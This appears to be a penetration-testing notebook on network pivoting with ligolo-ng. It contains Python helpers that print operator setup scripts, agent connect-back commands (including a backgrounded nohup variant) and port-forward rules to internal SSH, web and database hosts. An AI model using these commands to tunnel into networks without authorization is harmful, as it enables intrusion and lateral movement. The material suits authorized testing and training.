# ligolo-ng — Network Pivoting

ligolo-ng creates a TUN interface on the operator machine. Traffic routed through it exits via the agent on the target network.

## Architecture diagram

In [ ]:
diagram = """
Operator Machine                      Target / Agent Machine
─────────────────                     ──────────────────────
 ligolo-ng proxy  ◄──TLS session────  ligolo-ng agent
 TUN interface                        (inside target network)
 (ligolo)
   │
   │  ip route add 192.168.1.0/24 dev ligolo
   ▼
 Traffic to 192.168.1.x exits through agent
"""
print(diagram)

## Setup script generator

In [ ]:
def operator_setup(tun_name="ligolo", listen_port=11601, internal_subnets=None):
    subnets = internal_subnets or ["192.168.1.0/24"]
    lines = [
        "#!/bin/bash",
        "# Operator-side ligolo-ng setup",
        "",
        f"# 1. Create TUN interface",
        f"sudo ip tuntap add user $USER mode tun {tun_name}",
        f"sudo ip link set {tun_name} up",
        "",
        f"# 2. Start proxy",
        f"./proxy -selfcert -laddr 0.0.0.0:{listen_port}",
        "",
        "# After agent connects — run inside proxy shell:",
        "#   session",
        "#   start",
        "",
        "# 3. Add routes for internal subnets",
    ]
    for subnet in subnets:
        lines.append(f"sudo ip route add {subnet} dev {tun_name}")
    return "\n".join(lines)

print(operator_setup(internal_subnets=["192.168.1.0/24", "10.10.0.0/16"]))

## Agent connection commands

In [ ]:
def agent_commands(operator_ip, port=11601, platform="linux"):
    cmds = {
        "linux":   f"./agent -connect {operator_ip}:{port} -ignore-cert",
        "windows": f".\\agent.exe -connect {operator_ip}:{port} -ignore-cert",
        "background (linux)": f"nohup ./agent -connect {operator_ip}:{port} -ignore-cert &",
    }
    for plat, cmd in cmds.items():
        print(f"# {plat}")
        print(cmd)
        print()

agent_commands("10.0.0.1")

## Port redirect helper

In [ ]:
def listener_cmd(local_addr, local_port, target_host, target_port):
    return (f"listener_add --addr {local_addr}:{local_port} "
            f"--to {target_host}:{target_port} --tcp")

examples = [
    ("0.0.0.0", 8080, "192.168.1.100", 80),
    ("0.0.0.0", 2222, "192.168.1.50",  22),
    ("0.0.0.0", 5432, "10.10.0.20",    5432),
]
print("# In ligolo-ng proxy interactive shell:")
for args in examples:
    print(listener_cmd(*args))